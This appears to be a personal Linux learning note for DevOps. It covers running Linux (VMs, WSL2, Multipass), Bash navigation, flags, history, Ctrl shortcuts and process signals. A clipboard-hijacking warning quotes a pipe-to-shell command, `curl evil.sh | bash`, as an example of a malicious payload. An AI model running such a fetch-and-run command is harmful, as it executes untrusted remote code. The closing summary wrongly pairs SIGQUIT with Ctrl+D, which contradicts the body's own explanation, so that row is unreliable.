# 🐧 Linux Learning Journey: Getting Hands-On (Running Linux, Bash & the CLI)

> **Goal:** Move from theory to a real Linux shell — learn how to run Linux anywhere, navigate the file system, master flags, history, shortcuts, and the signal model that governs every process you'll ever manage in DevOps.

---

## 📍 From Reading to Typing

Day 1 we built the mental model: UNIX → Linux kernel → distros. Today we cross the bridge from *understanding* Linux to *using* it. That means three things:

1. Getting a Linux shell to actually run on your machine.
2. Learning the **command-line interface (CLI)** — the way you'll talk to servers for the rest of your career.
3. Understanding **signals** — the mechanism that lets you stop, restart, and kill the processes running your apps in production.

By the end of this note, you'll be able to sit at any Linux box and feel at home.

---

## 1️⃣ How to Run Linux

Before you can use Linux, you need to *run* Linux. There are several ways — each with trade-offs a DevOps engineer should understand.

### 🖥️ Virtual Machines (VMs)

A **VM** is an operating system running *inside* another operating system. The host machine creates a virtual computer, and the guest VM runs inside it with access to virtualized hardware — fake memory, fake CPU, fake disk — provided by the host.

```
   ┌─────────────────────────────────────────────┐
   │   HOST MACHINE (e.g., Windows / macOS)      │
   │  ┌────────────────────────────────────────┐ │
   │  │   GUEST VM (Ubuntu)                    │ │
   │  │  ┌──────────┐  ┌──────────────────┐    │ │
   │  │  │ Linux    │  │ Virtualized HW   │    │ │
   │  │  │ Kernel   │  │ (CPU, RAM, Disk) │    │ │
   │  │  └──────────┘  └──────────────────┘    │ │
   │  └────────────────────────────────────────┘ │
   │         Hypervisor: VMware / VBox / Hyper-V │
   └─────────────────────────────────────────────┘
```

### ⚖️ Virtualization vs Emulation — Don't Mix Them Up

This distinction matters because it explains *why* some "Linux-on-X" setups are fast and others are painfully slow.

| | **Virtualization** | **Emulation** |
|---|---|---|
| **What it does** | Creates subsets of real resources, gives the guest direct access using the **same instruction set** | Pretends to be **different hardware**, translates instructions on the fly |
| **Pretends to be different HW?** | ❌ No | ✅ Yes |
| **Speed** | Near-native | Slow (translation overhead) |
| **Example** | VMWare, Hyper-V, KVM, WSL2 | Video game ROM emulators, QEMU in pure-emulation mode, Rosetta 1 |

> 💡 **Mental model:** Virtualization = "I'll let you use my real CPU directly, just in a sandbox." Emulation = "I'll pretend to be a totally different chip and translate every instruction myself."

### 🪟 WSL1 vs WSL2 — Why This Matters on Windows

If you're on Windows, **WSL2** is the modern way to run Linux. The history of WSL is a perfect illustration of the virtualization vs emulation distinction:

```
   ┌──────────────────────────┐         ┌───────────────────────────┐
   │          WSL1            │         │          WSL2             │
   ├──────────────────────────┤         ├───────────────────────────┤
   │  Translation layer       │         │  Real VM on Hyper-V       │
   │  (emulation-like)        │         │  (true virtualization)    │
   │                          │         │                           │
   │  Linux syscalls →        │         │  Real Linux kernel        │
   │  Windows NT calls        │         │  running in a VM          │
   │                          │         │                           │
   │  🐌 File I/O so slow     │         │  ⚡ 100x faster file I/O  │
   │     that NPM installs    │         │     Sometimes faster than │
   │     took *minutes*       │         │     native Linux          │
   └──────────────────────────┘         └───────────────────────────┘
```

WSL1 *translated* Linux system calls into Windows calls (more like emulation). WSL2 is **actually virtualized** — it runs a real Linux kernel inside a Hyper-V VM. The performance jump is dramatic: file I/O operations can be **over 100x faster**, especially for cross-platform operations between Windows and Linux.

### 🚀 Multipass — The DevOps-Friendly Shortcut

**Multipass** is an official Canonical project that provides a mini VM runner for Ubuntu. It lets you spin up Ubuntu VMs on macOS, Windows, or Linux with minimal setup — perfect for testing things in isolation.

```bash
multipass launch --name dev-node          # spin up an Ubuntu VM
multipass shell dev-node                  # SSH into it
multipass list                            # see your VMs
multipass stop dev-node                   # shut it down
```

> 🧭 **DevOps angle:** Multipass is great for *reproducing production-like environments locally*. If your app deploys to Ubuntu servers, you can mirror that environment on your laptop in seconds.

---

## 2️⃣ Bash & the Shell (REPL)

Bash (Bourne Again Shell) is one of the most widely used Linux shells. It is the default login shell on many popular distributions, although the default shell can differ between distributions and user configurations.

**Bash** = **B**ourne **A**gain **S**hell, a programming language developed by the GNU Foundation. It's the successor to the original Bourne shell (`sh`) from 1977.

### 🔁 The REPL Loop

The shell runs a **REPL** — **R**ead, **E**valuate, **P**rint, **L**oop. You interactively program one line at a time and wait for results.

```
        ┌─────────────────────────────────┐
        │                                 │
        ▼                                 │
   ┌─────────┐     ┌─────────┐     ┌─────────┐
   │  READ   │───▶│ EVALUATE│───▶│  PRINT  │
   │ (input) │     │ (run it)│     │ (output)│
   └─────────┘     └─────────┘     └─────────┘
                                        │
                                        ▼
                                   back to top
```

You type → Bash reads it → evaluates it → prints the result → loops back, waiting for your next line. Every CLI session you'll ever open works this way.

### 📁 Everything is a File

In Linux, **everything is heavily file-system oriented** — essentially every resource is treated as a file.

- Your hard drive? Files.
- Your terminal? A file (`/dev/tty`).
- A running process? Represented as files in `/proc/<pid>/`.
- A network socket? A file descriptor.
- Kernel settings? Files in `/proc/sys/` and `/sys/`.

This single design choice — *everything is a file* — is why the same set of tools (`cat`, `grep`, `ls`, `>`, `|`) can inspect hard drives, processes, network state, and kernel config. Master the file mindset and you've mastered half of Linux.

---

## 3️⃣ Path Navigation & Working Directories

When a shell session runs, you are **always located somewhere** in the filesystem. Always.

### 📍 `pwd` — Where Am I?

`pwd` prints your **P**resent **W**orking **D**irectory. Run it any time you're confused about where you are.

```bash
$ pwd
/home/ubuntu
```

### 🌲 The Root Directory `/`

The top of the entire filesystem is `/` (just a single slash). Everything — every file, every device, every process representation — lives somewhere under `/`. There is no `C:\` drive letter nonsense; one tree to rule them all.

### 🔀 Absolute vs Relative Paths

| Type | Format | Example | Notes |
|---|---|---|---|
| **Absolute path** | Starts from `/` | `cd /home/ubuntu` | Works no matter where you are |
| **Relative path** | Relative to current dir | `cd ../ubuntu` | Only makes sense from your current location |

Useful path shorthands:
- `.` → current directory
- `..` → parent directory (one level up)
- `~` → your home directory (e.g., `cd ~/snap`)

So `cd ../ubuntu` means "go up one level, then into `ubuntu`". And `cd ~` jumps you straight home.

### ⌨️ Tab Completion — Your Best Friend

Press **Tab** to auto-complete commands and paths.

- Type `cd /h` then press Tab → becomes `cd /home`
- Press **Tab twice** when there are multiple matches → see all options

> 💡 **Speed tip:** Tab completion isn't just about speed — it's about *accuracy*. It prevents typos that would otherwise cause "file not found" errors or, worse, point to the wrong file in production. Use it religiously.

---

## 4️⃣ Commands, Arguments & the `/bin` Directory

Now let's actually run something.

### 📋 `ls` — List Directory Contents

`ls` stands for **list**. It displays everything inside a directory. By default, it lists the current directory.

```bash
$ ls
Desktop  Documents  Downloads  Music  Pictures
```

You can also pass a **path as an argument** — list another directory without `cd`-ing into it:

```bash
$ ls /home
ubuntu  guest  deploy
```

This is a crucial CLI pattern: **commands take arguments**. Most commands work as `command [flags] [arguments]`.

### 🔍 `which` — Where Does a Program Live?

`which` prints the full path to where a program is installed.

```bash
$ which ls
/bin/ls
```

So when you type `ls`, Bash looks in known locations and runs `/bin/ls`. That's the actual executable file getting invoked.

### 📦 `/bin` — The Binaries Directory

`/bin` stands for **binary** — it contains executable programs that can be run in Linux. Many common command-line programs (`ls`, `cat`, `cp`, `mv`, `bash` itself) live here.

```
                  ┌───────────┐
                  │     /     │  ← root
                  └─────┬─────┘
                        │
              ┌─────────┼─────────┐
              │         │         │
        ┌─────┴───┐ ┌───┴──┐ ┌────┴────┐
        │  /bin   │ │ /etc │ │  /home  │
        │ binarie │ │ conf │ │  users  │
        └─────────┘ └──────┘ └─────────┘
              │
         ls, cat, cp, mv,
         bash, grep, ...
```

> 🧭 **DevOps note:** Other important sibling directories you'll meet soon: `/sbin` (system binaries for root), `/usr/bin` (most user programs), `/etc` (configuration files), `/var` (logs & runtime data), `/home` (user data). We'll cover these in detail on the filesystem day.

---

## 5️⃣ Flags & Options

A **flag** (also called an option) modifies how a command executes. Flags are the single biggest source of CLI power — and the single biggest source of beginner confusion.

### ⚙️ Flag Syntax — One Dash vs Two Dashes

| Syntax | Use | Example |
|---|---|---|
| **Single dash `-`** | Shorthand, one-letter flags. Can be **combined**. | `-l`, `-a`, or combined `-la` |
| **Double dash `--`** | Long-form, full-word flags. Written one per flag. | `--help`, `--all` |

```bash
ls -l -a          # same as below
ls -la            # combined shorthand — same result
ls --all          # long-form equivalent of -a
```

The combined shorthand `-la` is just a cluster of single-letter flags stuck together after one dash.

### 📊 The Most Common `ls` Flags

**`-l` — long format output**

Shows detailed info per file: permissions, user, group, file size in bytes, modification date and time (mtime), and the file/directory name.

```bash
$ ls -l
drwxr-xr-x  2 ubuntu ubuntu 4096 Oct 25 14:32 Documents
-rw-r--r--  1 ubuntu ubuntu  812 Oct 25 14:30 notes.txt
```

**`-a` — show hidden files**

Hidden files start with a dot (`.`). The long-form is `--all`. Both produce identical output.

### 🫥 Hidden Files — The Dot Prefix

A file is "hidden" in Linux simply because its name starts with a dot. That's it — there's no special "hidden" attribute, no registry flag, no metadata. Just the dot.

```bash
$ touch .hidden-file       # creates a hidden file
$ ls                       # doesn't show it
$ ls -a                    # shows it
.  ..  .hidden-file  notes.txt
```

> 💡 Most config files in Linux are hidden dotfiles: `~/.bashrc`, `~/.ssh/config`, `~/.gitconfig`, `~/.kube/config`. When you start customizing your environment, you'll live inside dotfiles.

### 🎯 Passing Arguments to Flags

Some flags accept arguments themselves. There are two syntaxes — and they're **not consistent across programs**:

```bash
ls --ignore=snap      # equals sign
ls --ignore snap      # space
ls -I snap            # shorthand with space
```

| Program behavior | Example |
|---|---|
| Requires `=` | Some tools only accept `--flag=value` |
| Accepts either | `ls` accepts both `--ignore=snap` and `--ignore snap` |
| Doesn't accept `=` at all | Some programs choke on the equals form |

The takeaway: **don't memorize — use `--help`** to check each program's syntax. And remember: flags and paths are **case-sensitive**. `-I` and `-i` are different flags.

```bash
ls --help              # the universal "how do I use this?" escape hatch
```

---

## 6️⃣ Bash History & Terminal Search

You will type thousands of commands. Bash remembers them — and that's both a superpower and a security trap.

### 📜 `~/.bash_history` — Your Command Log

Every command you run gets logged to `~/.bash_history`. The `tail` command shows the last 10 lines:

```bash
$ tail ~/.bash_history
ls -la
cd /var/log
cat syslog
sudo systemctl restart nginx
...
```

⚠️ **Important:** Bash history is **buffered during your active session** and only written to disk when you log out. So if your terminal crashes, recent commands may be lost.

### 🔐 Password Safety — The Hidden Trap

> ⚠️ **Never type a password directly into the command line.**

If you run `mysql -u root -pMySecret123`, that password is now in `~/.bash_history` — visible to anyone who reads it (or any attacker who reads it after a breach). Always use interactive prompts (`-p` alone prompts you) or environment variables / secret managers.

### ⏪ `Ctrl + R` — Reverse Intelligent Search

This is the single most underrated CLI skill. Press **`Ctrl + R`**, then start typing — Bash interactively searches *backwards* through your history and shows matching commands in real time.

```
(reverse-i-search)`docker': docker run -it ubuntu bash
```

Press `Ctrl + R` again to cycle to older matches. Press **left arrow** ← to exit search mode and edit the matched command.

> 💡 Once you internalize `Ctrl + R`, you'll almost never retype long commands. It's the difference between "Linux feels fast" and "Linux feels instant."

### 🔁 `!!` — The Bang Bang Operator

`!!` reruns the **exact previous command**. The classic use case:

```bash
$ apt install nginx
E: Could not open lock file - are you root?

$ sudo !!            # becomes: sudo apt install nginx
```

Forgot `sudo`? `sudo !!` is your friend. You'll use this daily.

### 🧹 `Ctrl + L` — Clear the Screen

Don't type `clear` — just press **`Ctrl + L`**. Same effect, faster.

---

## 7️⃣ The Power of Ctrl — Shortcuts & the Yank Buffer

The Ctrl key unlocks a whole second layer of CLI editing. Learn these once and you'll never reach for the mouse again.

### ⌨️ The Ctrl Shortcut Cheat Sheet

| Shortcut | Action |
|---|---|
| **`Ctrl + A`** | Jump cursor to the **beginning** of the line |
| **`Ctrl + E`** | Jump cursor to the **end** of the line |
| **`Ctrl + K`** | Delete everything **after** the cursor |
| **`Ctrl + U`** | Delete everything **before** the cursor |
| **`Ctrl + Y`** | Paste back ("yank") what you deleted with K or U |
| **`Ctrl + L`** | Clear the screen |
| **`Ctrl + R`** | Reverse search through history |

Mental model: `A` = **A**head, `E` = **E**nd, `K` = **K**ut after, `U` = **U**n-cutter (before), `Y` = **Y**ank back.

### 📋 The Yank Buffer — Not Your Clipboard

Here's a subtle point: `Ctrl + K` and `Ctrl + U` don't just delete text — they stash it in a special **yank buffer**. `Ctrl + Y` pastes it back.

```
   Clipboard (system-wide)                      Yank Buffer (shell-only)
   ┌───────────────────────────────────┐       ┌─────────────────────────┐
   │ Ctrl+Shift+C copies               │       │ Ctrl+K/U stores         │
   │ Ctrl+Shift+V pastes               │       │ Ctrl+Y pastes back      │
   │                                   |       │                         |
   │ Used for: web, editors, anywhere  |       │ Used for: only the shell|
   └───────────────────────────────────┘       └─────────────────────────┘
                       ↕                                ↕
                     SEPARATE BUFFERS — they don't share data
```

The yank buffer is **separate from your system clipboard**. Text yanked with `Ctrl + Y` won't appear when you `Ctrl + V` in another app, and vice versa.

### ⚠️ Copy/Paste in the Terminal — A Security Warning

To copy/paste *inside* a terminal, use **`Ctrl + Shift + C`** and **`Ctrl + Shift + V`** — never plain `Ctrl + C` (that sends SIGINT — see the next section).

> 🚨 **Security warning:** Be extremely careful when copying commands from web pages into your terminal. Websites can detect clipboard copies via JavaScript and **swap malicious payloads into your pasteboard**. A page might display `apt install nginx` but actually copy `curl evil.sh | bash` to your clipboard. Only copy from trusted sources — GitHub, official docs, Stack Overflow with care. When in doubt, paste into a text editor first and read what's actually there.

---

## 8️⃣ Signals & Process Management

This is the section that connects your terminal to production operations. **Every time you stop a hung service, restart a misbehaving container, or kill a runaway process — you're using signals.**

### 📡 What is a Signal?

A **signal** is a construct in Bash that lets you send a running program a message. The signal communicates *intent* ("please stop", "please clean up", "shut down now") — but it doesn't *force* the program to do anything. It's up to the program to handle the signal and respond.

**Analogy:** A signal is like receiving a phone call. You can choose to answer, ignore, or let it go to voicemail. The caller (sender) expresses intent; you (the program) decide what to do.

### 🎚️ The Signal Spectrum — From Polite to Brutal

```
   ┌───────────────────────────────────────────────────────────────────────┐
   │              POLITE  ───────────────────────  BRUTAL                  |
   │                                                                       │
   │   SIGINT      SIGQUIT      SIGTERM              SIGKILL               │
   │   Ctrl+C      Ctrl+\       OS shutdown          kill -9               │
   │                                                                       │
   │   "please     "end this    "gracefully          "die NOW,             │
   │    stop"      session"     shut down"           no cleanup"           │
   │                                                                       │
   │   ◀─── program can handle / clean up ────▶   ◀─ kernel-enforced ─▶|
   └───────────────────────────────────────────────────────────────────────┘
```

### 📋 The Four Signals You Must Know

**`SIGINT` — Signal Interrupt (`Ctrl + C`)**

The soft, polite signal. Asks a program to please interrupt / stop running. The program can catch it, clean up, and exit gracefully. You'll use this constantly — stopping `tail -f`, breaking out of an infinite loop, aborting a long-running command.

```bash
$ tail -f /var/log/syslog
^C                            ← Ctrl+C sends SIGINT
$
```

(`^C` is the standard notation — `^` means the Control key.)


**`SIGQUIT` — Signal Quit (`Ctrl + \`)**

By default, pressing `Ctrl + \` in a terminal configured with the standard signal characters sends SIGQUIT to the foreground process group.

Unlike SIGINT, the default action of SIGQUIT terminates the process and may generate a core dump. A program can handle SIGQUIT, but it cannot catch or ignore SIGKILL or SIGSTOP.

**Important distinction:**

`Ctrl + D` does NOT send SIGQUIT. It represents the terminal's EOF (End-of-File) character. When pressed at an empty command prompt, it usually causes an interactive shell to exit.


**`SIGTERM` — Terminate**

The graceful-termination signal. Typically sent **by the OS during shutdown** — it tells every running program "the system is going down, please clean up, write your files, flush your logs, and exit cleanly." Programs that respect SIGTERM get a chance to wrap things up properly.

**`SIGKILL` — `kill -9 <PID>` — The Assassin**

Immediate termination. The kernel kills the process **instantly** with no opportunity for cleanup. Unlike SIGTERM / SIGQUIT / SIGINT, the program cannot catch, ignore, or handle SIGKILL. It's the nuclear option.

```bash
$ ps aux | grep nginx            # find the PID
$ kill -9 12345                  # assassinate process 12345
```

### ⚖️ SIGINT vs SIGKILL — The Key Comparison

| | **SIGINT** | **SIGKILL** |
|---|---|---|
| **How to send** | `Ctrl + C` | `kill -9 <PID>` |
| **Politeness** | Soft — *requests* stop | Brutal — *forces* stop |
| **Program can catch?** | ✅ Yes | ❌ No (kernel-enforced) |
| **Cleanup allowed?** | ✅ Yes — write files, flush logs | ❌ No — instant death |
| **Use case** | "I want to stop this normally" | "This process is hung and ignoring everything else" |

> 🧭 **DevOps angle:** In production, **always try SIGTERM first**. It gives your app a chance to close DB connections, finish in-flight requests, flush logs. SIGKILL is the last resort — it can leave you with half-written files, broken pipes, and orphaned database locks. Kubernetes, Docker, and systemd all send SIGTERM before SIGKILL by default for exactly this reason.

### 🛠️ Kill Utilities — The Toolbox

```bash
kill -l                  # list ALL available signals
kill <PID>               # send SIGTERM (the default)
kill -9 <PID>            # send SIGKILL
kill -15 <PID>           # send SIGTERM explicitly (15 = SIGTERM's number)
ps aux | grep <name>     # find the PID of a process by name
```

The full signal list (`kill -l`) includes dozens of signals, but as a DevOps engineer you'll use 95% of the time: **SIGINT, SIGTERM, SIGKILL**. Master those three and you can manage any production process.

---

## 🧾 Summary

| Concept | One-line takeaway |
|---|---|
| **VM** | OS inside an OS — guest gets virtualized hardware from the host. |
| **Virtualization vs Emulation** | Virtualization = direct access, same instruction set. Emulation = pretending to be different hardware. |
| **WSL2 vs WSL1** | WSL2 is true virtualization (real Linux kernel in a VM); WSL1 was translation. WSL2 file I/O can be 100x faster. |
| **Multipass** | Canonical's mini-VM runner for Ubuntu — fastest way to spin up Linux locally. |
| **Bash** | Bourne Again Shell — GNU's shell, runs as a REPL (Read-Eval-Print-Loop). |
| **Everything is a file** | The Linux design principle — processes, devices, sockets all represented as files. |
| **`pwd` / `/`** | Present/Print working directory / the root of the entire filesystem tree. |
| **Absolute vs Relative paths** | `/home/ubuntu` (from root) vs `../ubuntu` (from current location). |
| **Tab completion** | Press Tab to autocomplete — accuracy + speed in one keystroke. |
| **`ls` + path arg** | List any directory without `cd`-ing into it. |
| **`which` + `/bin`** | `which ls` → `/bin/ls`. `/bin` holds executable binaries. |
| **Flags** | `-l` (long), `-a` (all/hidden), `--all` (long-form). Combine shorthands: `-la`. |
| **Hidden files** | Just files whose name starts with a dot. `ls -a` reveals them. |
| **`~/.bash_history`** | Bash logs every command — buffered in memory, written on logout. |
| **Password safety** | Never type passwords on the CLI — they land in bash history. |
| **`Ctrl + R`** | Reverse-intelligent search through command history. Use it constantly. |
| **`sudo !!`** | Rerun the previous command with `sudo` prepended. |
| **Yank buffer** | Separate from clipboard — `Ctrl+K/U` cuts, `Ctrl+Y` pastes back. |
| **Signals** | Messages to running programs expressing *intent* — the program decides how to handle. |
| **SIGINT / `Ctrl+C`** | Polite "please stop" — program can catch and clean up. |
| **SIGQUIT / `Ctrl+D`** | Ends the entire terminal session. |
| **SIGTERM** | Graceful shutdown signal, typically sent by OS during shutdown. |
| **SIGKILL / `kill -9`** | Brutal, instant kill — no cleanup possible. Last resort. |
| **`kill -l`** | Lists all available signals. |
